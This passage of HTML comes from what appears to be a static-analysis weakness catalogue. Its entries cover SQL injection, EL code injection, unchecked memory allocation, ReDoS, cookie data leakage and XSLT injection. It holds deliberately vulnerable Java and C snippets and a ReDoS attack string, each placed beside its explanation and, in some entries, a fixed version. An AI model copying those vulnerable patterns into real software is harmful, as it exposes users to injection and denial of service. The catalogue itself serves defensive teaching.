        <span class="n">username</span> <span class="o">+</span> <span class="s">" and password ="</span> <span class="o">+</span> <span class="n">pwd</span><span class="o">;</span>     
      <span class="n">PreparedStatement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sqlString</span><span class="o">);</span>

      <span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
      <span class="k">if</span> <span class="o">(!</span><span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">())</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">SecurityException</span><span class="o">(</span><span class="s">"User name or password incorrect"</span><span class="o">);</span>
      <span class="o">}</span>

      <span class="c1">// Authenticated; proceed</span>
    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="k">try</span> <span class="o">{</span>
        <span class="n">connection</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
      <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SQLException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// Forward to handler</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution uses a parametric query with a ? character as a placeholder for the argument. This code also validates the length of the username argument, preventing an attacker from submitting an arbitrarily long user name.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doPrivilegedAction</span><span class="o">(</span>
  <span class="n">String</span> <span class="n">username</span><span class="o">,</span> <span class="kt">char</span><span class="o">[]</span> <span class="n">password</span>
<span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
  <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">getConnection</span><span class="o">();</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">connection</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Handle error</span>
  <span class="o">}</span>
  <span class="k">try</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">pwd</span> <span class="o">=</span> <span class="n">hashPassword</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>

    <span class="c1">// Validate username length</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">username</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Handle error</span>
    <span class="o">}</span>

    <span class="n">String</span> <span class="n">sqlString</span> <span class="o">=</span>
      <span class="s">"select * from db_user where username=? and password=?"</span><span class="o">;</span>
    <span class="n">PreparedStatement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sqlString</span><span class="o">);</span>
    <span class="n">stmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">username</span><span class="o">);</span>
    <span class="n">stmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
    <span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">())</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="n">SecurityException</span><span class="o">(</span><span class="s">"User name or password incorrect"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="c1">// Authenticated; proceed</span>
  <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">connection</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SQLException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Forward to handler</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Use the <code>set*()</code> methods of the PreparedStatement class to enforce strong type checking. This technique mitigates the SQL injection vulnerability because the input is properly escaped by automatic entrapment within double quotes. Note that prepared statements must be used even with queries that insert data into the database.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/89.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/web.html">Web</a>
                <a href="../../tag/java.html">Java</a>
                <a href="../../tag/injection.html">Injection</a>
                <a href="../../tag/cwe-89.html">CWE-89</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7547">Struts Form without input validation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Struts Form without input validation</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Form inputs should have minimal input validation. Preventive validation helps provide defense in depth against a variety of risks.
</p>
<p>
Validation can be introduce by implementing a <code>validate</code> method.
<pre>
public class RegistrationForm extends ValidatorForm {</pre></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span>private String name;
private String email;

[...]

public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {
    //Validation code for name and email parameters passed in via the HttpRequest goes here
}
</pre></div>
</td></tr></table>
<p>}
</p></p>

<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a><br/>
<a href="http://cwe.mitre.org/data/definitions/106.html">CWE-106: Struts: Plug-in Framework not in Use</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7569">Potential code injection when using Expression Language (EL)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potential code injection when using Expression Language (EL)</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    A expression is built with a dynamic value. The source of the value(s) should be verified to avoid
    that unfiltered values fall into this risky code evaluation.
</p>
<p><b>Code at risk:</b></p>
<p>
<pre>public void evaluateExpression(String expression) {
    FacesContext context = FacesContext.getCurrentInstance();
    ExpressionFactory expressionFactory = context.getApplication().getExpressionFactory();
    ELContext elContext = context.getELContext();
    ValueExpression vex = expressionFactory.createValueExpression(elContext, expression, String.class);
    return (String) vex.getValue(elContext);
}</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="http://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html">Minded Security: Abusing EL for executing OS commands</a><br/>
<a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html">The Java EE 6 Tutorial: Expression Language</a><br/>
<a href="http://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a><br/>
<a href="http://cwe.mitre.org/data/definitions/95.html">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')</a><br/>
<a href="https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf">Minded Security: Expression Language Injection</a><br/>
<a href="http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/">Dan Amodio's blog: Remote Code with Expression Language Injection</a><br/>
<a href="http://blog.h3xstream.com/2014/11/remote-code-execution-by-design.html">Remote Code Execution .. by design</a>: Example of malicious payload. The samples given could be used to test sandboxing rules.<br/>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0088">Uncontrolled Memory Allocation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a></li>
<li><a href="#fixed-code-example-1">Fixed code Example 1</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a></li>
<li><a href="#fixed-code-example-2">Fixed code Example 2</a></li>
<li><a href="#vulnerable-code-example-3">Vulnerable code Example 3</a></li>
<li><a href="#fixed-code-example-3">Fixed code Example 3</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The product allocates memory based on an untrusted size value, but it does not validate or incorrectly validates the size, allowing arbitrary amounts of memory to be allocated. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Not controlling memory allocation can result in a request for too much system memory, possibly leading to a crash of the application due to out-of-memory conditions, or the consumption of a large amount of memory on the system. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Perform adequate input validation against any value that influences the amount of memory that is allocated. Define an appropriate strategy for handling requests that exceed the limit, and consider supporting a configuration option so that the administrator can extend the amount of memory to be used if necessary.</p>
<p>Run your program using system-provided resource limits for memory. This might still cause the program to crash or exit, but the impact to the rest of the system will be minimized. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<p>Consider the following code, which accepts an untrusted size value and allocates a buffer to contain a string of the given size.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">totBytes</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">);</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">string</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">totBytes</span><span class="p">);</span>
<span class="n">InitializeString</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<p>Suppose an attacker provides a size value of:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span>12345678
</pre></div>
</td></tr></table>
<p>This will cause 305,419,896 bytes (over 291 megabytes) to be allocated for the string.</p>
<h3 id="fixed-code-example-1">Fixed code Example 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">totBytes</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">);</span>

<span class="c1">// Ensure the size is acceptable...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">totBytes</span> <span class="o">&gt;</span> <span class="mi">100000000</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Out of memory!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="n">error_handler</span><span class="p">();</span>
 <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="o">*</span><span class="n">string</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">totBytes</span><span class="p">);</span>
<span class="n">InitializeString</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<p>Consider the following code, which accepts an untrusted size value and uses the size as an initial capacity for a HashMap.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>
<span class="n">HashMap</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<p>The HashMap constructor will verify that the initial capacity is not negative, however there is no check in place to verify that sufficient memory is present. If the attacker provides a large enough value, the application will run into an OutOfMemoryError.</p>
<h3 id="fixed-code-example-2">Fixed code Example 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">GetUntrustedInt</span><span class="p">();</span>

<span class="c1">// Ensure the size is acceptable...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">10000000</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Out of memory!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="n">error_handler</span><span class="p">();</span>
 <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">HashMap</span> <span class="n">list</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HashMap</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-3">Vulnerable code Example 3</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">length</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">)</span> 
    <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">length</span><span class="p">);</span>
    <span class="p">...</span>
    <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example-3">Fixed code Example 3</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">const</span> <span class="kt">int</span> <span class="n">MAX_LENGTH</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>  
<span class="kt">void</span> <span class="nf">example_fun</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">)</span> 
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">length</span><span class="o">&gt;</span><span class="n">MAX_LENGTH</span> <span class="o">||</span> <span class="n">length</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">length</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">buffer</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="p">...</span>
        <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/400.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/c.html">C++</a>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/cwe-789.html">CWE-789</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7151">May expose internal representation by incorporating reference to mutable object</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>May expose internal representation by incorporating reference to mutable object</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p> This code stores a reference to an externally mutable object into the
  internal representation of the object. 
   If instances
   are accessed by untrusted code, and unchecked changes to
   the mutable object would compromise security or other
   important properties, you will need to do something different.
  Storing a copy of the object is better approach in many situations.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>low</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7509">Regex DOS (ReDOS)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Regex DOS (ReDOS)</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    Regular expressions (regexs) are frequently subject to Denial of Service (DOS) attacks (called ReDOS). This is due to the fact that regex engines 
    may take a large amount of time when analyzing certain strings, depending on how the regex is defined.
<p>
    For example, for the regex: <b>^(a+)+$</b>, the input "<code>aaaaaaaaaaaaaaaaX</code>" will cause the regex engine to analyze 65536 
different paths.<sup>[1] Example taken from OWASP references</sup></p>
<p>
Therefore, it is possible that a single request may cause a large amount of computation on the server side. 
The problem with this regex, and others like it, is that there are two different ways the same input character can be accepted by the 
Regex due to the + (or a <em>) inside the parenthesis, and the + (or a </em>) outside the parenthesis. The way this is written, either + could 
consume the character 'a'. To fix this, the regex should be rewritten to eliminate the ambiguity. For example, this could simply be 
rewritten as: <b>^a+$</b>, which is presumably what the author meant anyway (any number of a's). Assuming that's what the original 
regex meant, this new regex can be evaluated quickly, and is not subject to ReDOS.
</p>
<p>It is recommended to find ReDos via ReScue<a href="https://2bdenny.github.io/ReScue/">ReScue</a>.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>critical</p>
<h1 id="references">References</h1>
<p><a href="http://www.jroller.com/sebastianKuebeck/entry/detecting_and_preventing_redos_vulnerabilities">Sebastian Kubeck's Weblog: Detecting and Preventing ReDoS Vulnerabilities</a><br/>
<sup>[1]</sup> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">OWASP: Regular expression Denial of Service</a><br/>
<a href="http://cwe.mitre.org/data/definitions/400.html">CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion')</a><br/>
<a href="https://2bdenny.github.io/ReScue/">ReScue</a>
</p></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7488">Potentially sensitive data in a cookie</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potentially sensitive data in a cookie</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The information stored in a custom cookie should not be sensitive or related to the session. In most cases, sensitive data should only be stored in session
and referenced by the user's session cookie. See HttpSession (HttpServletRequest.getSession())</p>
<p>Custom cookies can be used for information that needs to live longer than and is independent of a specific session.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="reference">Reference</h1>
<p><a href="http://cwe.mitre.org/data/definitions/315.html">CWE-315: Cleartext Storage of Sensitive Information in a Cookie</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1094">XSLT Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>XSLT (Extensible Stylesheet Language Transformations) is a language for transforming XML documents into other XML documents, or other formats such as HTML for web pages, plain text or XSL Formatting Objects, which may subsequently be converted to other formats, such as PDF, PostScript and PNG. XSLT 1.0 is widely supported in modern web browsers.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>XSLT injection may cause information exposure, arbitrary code execution, malicious file reading/writing and injection problems.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-wikipedia">
<p>https://en.wikipedia.org/wiki/XSLT <a class="footnote-backref" href="#fnref-wikipedia" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7043">Method invoked that should be only be invoked inside a doPrivileged block</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Method invoked that should be only be invoked inside a doPrivileged block</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p> This code invokes a method that requires a security permission check.
  If this code will be granted security permissions, but might be invoked by code that does not
  have security permissions, then the invocation needs to occur inside a doPrivileged block.</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
